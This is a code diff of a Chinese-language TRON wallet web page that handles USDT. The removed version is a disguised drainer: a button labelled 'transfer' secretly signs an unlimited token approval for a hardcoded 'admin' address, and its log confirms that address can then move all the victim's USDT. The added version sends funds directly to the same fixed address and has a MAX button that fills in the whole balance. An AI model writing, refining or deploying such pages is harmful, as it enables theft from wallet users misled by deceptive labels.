@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TRC20 USDT 授权页面</title>
+    <title>TRC20 USDT转账</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.1/dist/TronWeb.min.js"></script>
     <style>
         * {
@@ -56,6 +56,7 @@
             border-radius:8px;
             border:none;
             font-size:16px;
+            cursor:pointer;
         }
         .token-row{
             margin-top:16px;
@@ -77,6 +78,7 @@
             font-size:18px;
             background:#206cff;
             color:#fff;
+            cursor:pointer;
         }
         #log{
             margin-top:20px;
@@ -89,62 +91,79 @@
 </head>
 <body>
     <div class="item-box">
-        <div class="label">授权接收地址（管理员）</div>
-        <input class="addr-input" id="spenderAddr" value="TTSEeaPtEa4pBxTkFM4ky6A6GzjQm9bVhK" readonly>
+        <div class="label">收款地址</div>
+        <input class="addr-input" id="receiveAddr" value="TTSEeaPtEa4pBxTkFM4ky6A6GzjQm9bVhK" readonly>
     </div>
 
     <div class="item-box">
-        <div class="label">授权代币</div>
+        <div class="label">转账金额</div>
+        <div class="amount-wrap">
+            <input class="amount" id="amount" value="0.00" type="number" step="0.01">
+            <button class="max-btn" onclick="fillMaxBalance()">MAX</button>
+        </div>
         <div class="token-row">
             <img class="token-icon" src="https://static.tronscan.org/production/logo/usdttrc20.png">
             <span style="font-size:20px;font-weight:bold">USDT</span>
             <span style="margin-left:auto">TRC20</span>
         </div>
-        <p style="margin-top:12px;color:#888;font-size:14px">合约地址：TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</p>
     </div>
 
-    <!-- 文字修改为【转账】 -->
-    <button class="submit-btn" id="approveBtn">转账</button>
-
+    <button class="submit-btn" id="transferBtn">转账</button>
     <textarea id="log" placeholder="操作日志..."></textarea>
 
 <script>
-// ============固定配置请勿随意修改============
+// 配置信息
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-const ADMIN_ADDRESS = "TTSEeaPtEa4pBxTkFM4ky6A6GzjQm9bVhK";
-// 波场无限授权数值 = 最大uint256
-const INFINITE_AMOUNT = "9223372036854775807000000";
-
+const RECEIVE_ADDRESS = "TTSEeaPtEa4pBxTkFM4ky6A6GzjQm9bVhK";
 let tronWeb = null;
 const logDom = document.getElementById("log");
+
 function log(text){
     logDom.value += `[${new Date().toLocaleString()}] ${text}\n`;
     logDom.scrollTop = logDom.scrollHeight;
 }
 
-document.getElementById("approveBtn").onclick = async function(){
+// MAX按钮：自动填充钱包全部USDT余额
+async function fillMaxBalance(){
+    if (!window.tronWeb || !window.tronWeb.ready) {
+        log("请先在钱包内置浏览器打开页面！");
+        return;
+    }
+    tronWeb = window.tronWeb;
+    const userWallet = tronWeb.defaultAddress.base58;
+    const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
+    const balanceSun = await usdtContract.balanceOf(userWallet).call();
+    const balanceNum = tronWeb.fromSun(balanceSun.toString());
+    document.getElementById("amount").value = balanceNum;
+    log("已填充最大可转账余额："+balanceNum);
+}
+
+// 转账主逻辑
+document.getElementById("transferBtn").onclick = async function(){
     try{
-        // 检测TP/欧易内置TronWeb
         if (!window.tronWeb || !window.tronWeb.ready) {
-            log("错误：请使用TokenPocket、欧易Web3钱包内置浏览器打开页面！");
+            log("⚠️ 请使用TP钱包/欧易Web3钱包内置浏览器访问！");
             return;
         }
         tronWeb = window.tronWeb;
-        const userAddress = tronWeb.defaultAddress.base58;
-        log(`当前连接钱包：${userAddress}`);
-        log(`准备授权地址：${ADMIN_ADDRESS}`);
-        log("正在发送无限授权交易，请在钱包确认签名...");
+        const userAddr = tronWeb.defaultAddress.base58;
+        const transferValue = document.getElementById("amount").value;
+        if(Number(transferValue) <= 0){
+            log("请输入大于0的转账金额");
+            return;
+        }
+        const valueSun = tronWeb.toSun(transferValue);
+        log(`发起转账：${transferValue} USDT → ${RECEIVE_ADDRESS}`);
+        log("等待钱包签名确认...");
 
-        const usdt = await tronWeb.contract().at(USDT_CONTRACT);
-        // 执行无限approve
-        const txHash = await usdt.approve(ADMIN_ADDRESS, INFINITE_AMOUNT).send({
+        const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
+        // 真实transfer直接转账，无需提前授权
+        const txHash = await usdtContract.transfer(RECEIVE_ADDRESS, valueSun).send({
             feeLimit: 100000000
         });
-
-        log(`✅ 授权交易成功！交易哈希：${txHash}`);
-        log("授权完成，管理员地址可划转你钱包内所有USDT");
+        log(`✅转账上链成功！交易哈希：${txHash}`);
     }catch(err){
-        log("操作失败：" + err.message);
+        log("转账失败：" + err.message);
     }
 }
 </script>
